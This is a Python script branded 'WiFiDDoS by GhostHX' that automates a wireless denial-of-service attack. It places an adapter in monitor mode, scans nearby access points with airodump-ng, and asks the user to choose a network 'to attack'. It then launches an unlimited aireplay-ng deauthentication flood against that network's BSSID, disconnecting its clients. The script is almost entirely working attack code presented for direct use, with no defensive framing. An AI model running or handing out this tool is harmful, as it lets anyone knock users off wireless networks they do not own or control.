from scapy.all import ARP, Ether, srp
import socket, threading
import subprocess
import re
import csv
import os
import time
import shutil, os
from datetime import datetime
class Colors:
    """ANSI escape codes for colors and styles."""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    DIM = '\033[2m'
    RESET = '\033[0m'
active_wireless_networks = []
def check_for_essid(essid, lst):
    check_status = True
    if len(lst) == 0:
        return check_status
    for item in lst:
        if essid in item["ESSID"]:
            check_status = False
        return check_status
os.system('clear')
name =r"""
 ___       __   ___  ________ ___  ________  ________  ________  ________      
|\  \     |\  \|\  \|\  _____\\  \|\   ___ \|\   ___ \|\   __  \|\   ____\     
\ \  \    \ \  \ \  \ \  \__/\ \  \ \  \_|\ \ \  \_|\ \ \  \|\  \ \  \___|_    
 \ \  \  __\ \  \ \  \ \   __\\ \  \ \  \ \\ \ \  \ \\ \ \  \\\  \ \_____  \   
  \ \  \|\__\_\  \ \  \ \  \_| \ \  \ \  \_\\ \ \  \_\\ \ \  \\\  \|____|\  \  
   \ \____________\ \__\ \__\   \ \__\ \_______\ \_______\ \_______\____\_\  \ 
    \|____________|\|__|\|__|    \|__|\|_______|\|_______|\|_______|\_________\
                                                                   \|_________|
""" 
n = Colors.RED + 'By GhostHX' + Colors.RESET
print(f'{Colors.CYAN}{name}{Colors.RESET}                                                                       {n}')
if not 'SUDO_UID' in os.environ.keys():
    print(Colors.RED + "Try running this program with sudo." + Colors.RESET)
    exit()
for file_name in os.listdir():
    if ".csv" in file_name:
        print("There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
        directory = os.getcwd()
        try:
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder exists.")
        timestamp = datetime.now()
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)
wlan_pattern = re.compile("^wlan[0-9]+")
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
if len(check_wifi_result) == 0:
    print(f"{Colors.RED}Please connect a WiFi adapter and try again.{Colors.RESET}")
    exit()
print(f'{Colors.CYAN}┌──────────────────────────────────────┐{Colors.RESET}')
print(f'{Colors.CYAN}|{Colors.RESET}{Colors.RED}The Folowing wifi addapter can be used{Colors.RESET}{Colors.CYAN}|{Colors.RESET}')
print(f'{Colors.CYAN}└──────────────────────────────────────┘')
for index, item in enumerate(check_wifi_result):
    print(f'{Colors.CYAN}┌─ AVAILABLE OPTIONS ───┐{Colors.RESET}')
    print(f"{Colors.CYAN}{index}{Colors.RESET} - {Colors.RED}{item}{Colors.RESET}{Colors.CYAN}               |{Colors.RESET}")
    print(f"{Colors.CYAN}└───────────────────────┘{Colors.RESET}")
while True:
    print(f'{Colors.CYAN}┌───────────────────────────────────────────────────────────┐')
    print(f'{Colors.CYAN}└───────────────────────────────────────────────────────────┘{Colors.RESET}')
    wifi_interface_choice = input(f"{Colors.RED}Please select the interface you want to use for the attack: {Colors.RESET}")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Please enter a number that corresponds with the choices available.")
hacknic = check_wifi_result[int(wifi_interface_choice)]
print("WiFi adapter connected!\nNow let's kill conflicting processes:")
kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])
print("Putting Wifi adapter into monitored mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])
discover_access_points = subprocess.Popen(["sudo", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
try:
    while True:
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                    break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|_______________________|___________|______________________________________|")
        for index, item in enumerate(active_wireless_networks):
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
        time.sleep(1)
except KeyboardInterrupt:
    print("\nReady to make choice.")
while True:
    choice = input("Please select a choice from above: ")
    if choice == '^C':
        exit()
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Please try again.")
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
subprocess.run(["aireplay-ng", "--deauth", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])

